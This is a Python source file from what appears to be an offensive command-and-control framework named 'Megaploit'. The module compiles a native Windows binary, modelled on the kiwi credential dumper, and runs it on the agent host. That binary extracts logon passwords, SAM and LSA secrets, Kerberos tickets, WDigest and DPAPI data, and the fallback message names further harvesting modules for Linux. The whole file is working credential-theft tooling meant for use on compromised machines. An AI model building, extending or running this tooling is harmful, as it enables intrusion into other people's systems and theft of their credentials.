"""
megaploit.native.kiwi.kiwi_runner
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Python bridge between the Megaploit C2 and the native megaploit_kiwi binary.

Responsibilities
----------------
1. Compile megaploit_kiwi.c on first use (or when the source is newer than
   the binary).  Uses MinGW-w64 on Windows if available, falls back to MSVC
   via cl.exe, and emits a clear error if neither is found.
2. Execute the compiled binary with the requested module/arguments as a
   subprocess, capturing stdout (the result string) and stderr (errors).
3. Provide :func:`run_kiwi` — the single entry point called by the agent
   handler.

All output is line-prefixed with "[+]" / "[-]" / "[*]" as emitted by the C
binary, so the operator console renders it identically to every other handler.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
import threading
from typing import Optional

# ── Paths ─────────────────────────────────────────────────────────────────

_HERE   = os.path.dirname(os.path.abspath(__file__))
_SRC    = os.path.join(_HERE, "megaploit_kiwi.c")
_EXE_W  = os.path.join(_HERE, "megaploit_kiwi.exe")   # Windows
_EXE_L  = os.path.join(_HERE, "megaploit_kiwi")       # Linux/macOS

_build_lock = threading.Lock()


def _binary_path() -> str:
    """Return the expected binary path for the current platform."""
    return _EXE_W if sys.platform == "win32" else _EXE_L


def _needs_rebuild() -> bool:
    """Return True if the binary doesn't exist or the source is newer."""
    binary = _binary_path()
    if not os.path.isfile(binary):
        return True
    src_mtime = os.path.getmtime(_SRC)
    bin_mtime = os.path.getmtime(binary)
    return src_mtime > bin_mtime


# ── Compiler detection ────────────────────────────────────────────────────

def _find_compiler() -> tuple[list[str], list[str]]:
    """
    Return (compile_cmd, extra_flags) for the best available C compiler.

    Priority on Windows : MinGW gcc → MSVC cl
    Priority on Linux   : x86_64-w64-mingw32-gcc → gcc (stub)

    Raises RuntimeError if no compiler is found.
    """
    if sys.platform == "win32":
        # MinGW gcc on Windows PATH
        if shutil.which("gcc"):
            flags = [
                "-std=c11", "-O2", "-Wall",
                "-DUNICODE", "-D_UNICODE",
                "-D_WIN32_WINNT=0x0600",
                "-o", _EXE_W, _SRC,
                "-lntdll", "-ladvapi32", "-lsecur32",
                "-lnetapi32", "-lcrypt32", "-lkernel32",
                "-lpsapi", "-luserenv", "-lws2_32",
            ]
            return (["gcc"], flags)
        # MSVC
        if shutil.which("cl"):
            flags = [
                f"/Fe:{_EXE_W}", "/std:c11", "/O2",
                "/D", "UNICODE", "/D", "_UNICODE",
                "/D", "_WIN32_WINNT=0x0600",
                _SRC,
                "ntdll.lib", "advapi32.lib", "secur32.lib",
                "netapi32.lib", "crypt32.lib", "kernel32.lib",
                "psapi.lib", "userenv.lib", "ws2_32.lib",
            ]
            return (["cl"], flags)
        raise RuntimeError(
            "No C compiler found — install MinGW-w64 (gcc) or MSVC.\n"
            "  winget install MSYS2.MSYS2   # then  pacman -S mingw-w64-ucrt-x86_64-gcc"
        )
    else:
        # Cross-compiler on Linux → Windows EXE
        cross = "x86_64-w64-mingw32-gcc"
        if shutil.which(cross):
            flags = [
                "-std=c11", "-O2", "-Wall",
                "-DUNICODE", "-D_UNICODE",
                "-D_WIN32_WINNT=0x0600",
                "-o", _EXE_W, _SRC,
                "-lntdll", "-ladvapi32", "-lsecur32",
                "-lnetapi32", "-lcrypt32", "-lkernel32",
                "-lpsapi", "-luserenv", "-lws2_32",
            ]
            return ([cross], flags)
        # Native gcc — builds Linux no-op stub
        if shutil.which("gcc"):
            flags = ["-std=c11", "-O2", "-Wall", "-o", _EXE_L, _SRC]
            return (["gcc"], flags)
        raise RuntimeError(
            "No C compiler found — install gcc or x86_64-w64-mingw32-gcc.\n"
            "  apt-get install gcc mingw-w64"
        )


def _compile() -> str:
    """
    Compile megaploit_kiwi.c if needed.  Thread-safe.
    Returns the path to the compiled binary.
    Raises RuntimeError on compile failure.
    """
    with _build_lock:
        if not _needs_rebuild():
            return _binary_path()

        compiler, flags = _find_compiler()
        cmd = compiler + flags
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                cwd=_HERE,
                timeout=120,
            )
        except FileNotFoundError as e:
            raise RuntimeError(f"Compiler not found: {e}") from e
        except subprocess.TimeoutExpired:
            raise RuntimeError("Compiler timed out after 120 seconds")

        if result.returncode != 0:
            raise RuntimeError(
                f"Compile failed (exit {result.returncode}):\n"
                f"{result.stderr.strip()}"
            )
        return _binary_path()


# ── Public API ────────────────────────────────────────────────────────────

# Valid module names accepted by the binary
KIWI_MODULES = frozenset([
    "logonpasswords", "sam", "lsa", "credman",
    "tickets", "wdigest", "dpapi", "all",
])


def run_kiwi(module: str, extra_args: Optional[list[str]] = None,
             timeout: int = 60) -> str:
    """
    Compile (if needed) and execute megaploit_kiwi with *module*.

    Parameters
    ----------
    module:
        One of the KIWI_MODULES names, or any additional sub-command.
    extra_args:
        Additional positional arguments forwarded to the binary.
    timeout:
        Seconds to wait for the binary before killing it (default 60).

    Returns
    -------
    A multi-line string starting with "[+]" / "[-]" / "[*]" lines.
    """
    if sys.platform != "win32":
        return (
            "[-] kiwi: megaploit_kiwi is a Windows-only binary\n"
            "[*] On this platform use: hashdump, cred_vault, ssh_harvest, sudo_sniff"
        )

    try:
        binary = _compile()
    except RuntimeError as e:
        return f"[-] kiwi: compile error — {e}"

    cmd = [binary, module] + (extra_args or [])
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return f"[-] kiwi: timed out after {timeout}s"
    except (FileNotFoundError, PermissionError) as e:
        return f"[-] kiwi: could not execute binary — {e}"

    output = result.stdout
    if result.stderr:
        output += f"\n[*] stderr: {result.stderr.strip()}"
    if not output.strip():
        output = "[-] kiwi: no output produced"
    return output.rstrip()
